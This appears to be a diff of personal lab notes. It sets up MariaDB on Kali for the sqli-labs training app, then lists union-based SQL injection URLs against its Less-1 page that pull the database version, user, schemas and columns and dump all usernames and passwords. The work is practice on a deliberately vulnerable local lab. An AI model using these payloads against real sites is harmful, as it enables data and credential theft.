@@ -1,12 +1,11 @@
 root@kali-2017:~# service mysql start
-
 root@kali-2017:~# mysql -u root -p
 MariaDB [(none)]> use mysql;
 
 GRANT ALL PRIVILEGES ON *.* TO 'alex'@'localhost' IDENTIFIED BY 'password';
 root@kali-2017:~# service mysql restart
 
-root@kali-2017:/var/www/html/sqli-labs-php7/sql-connections# 
+root@kali-2017:/var/www/html/sqli-labs-php7/sql-connections# cd 
 update db-creds.inc
 m
 service mysql restart
@@ -19,3 +18,29 @@ general_log_file        = /var/log/mysql/mysql.log
 general_log             = 1
 
 root@kali-2017:/etc/mysql/mariadb.conf.d# service mysql restart
+
+OWASP A1 Pt3:
+
+True id=1 cannot display our disired output:
+localhost/sqli-labs-php7/Less-1/?id=1' UNION SELECT 1,2,3--+
+
+http://localhost/sqli-labs-php7/Less-1/?id=9999%27%20UNION%20SELECT%201,version(),database()--+
+
+http://localhost/sqli-labs-php7/Less-1/?id=9999%27%20UNION%20SELECT%201,user(),@@datadir--+
+
+Find out the schema table:
+localhost/sqli-labs-php7/Less-1/?id=-1' UNION SELECT * FROM users WHERE id='-1' union SELECT 1,group_concat(DISTINCT table_schema SEPARATOR ', '),
+3 FROM information_schema.tables WHERE table_schema!= 'mysql' AND table_schema != 'information_schema' --+
+
+Find out the table details:
+localhost/sqli-labs-php7/Less-1/?id=-1' UNION SELECT * FROM users WHERE id='-1' union SELECT 1,group_concat(DISTINCT column_name SEPARATOR ', '),
+3 FROM information_schema.columns WHERE table_schema='security' --+
+
+Show all username and password:
+localhost/sqli-labs-php7/Less-1/?id=-1' union select 1,group_concat(username SEPARATOR ', '), group_concat(password SEPARATOR ', ') from users --+
+
+OWASP A1 Pt4:
+
+
+
+
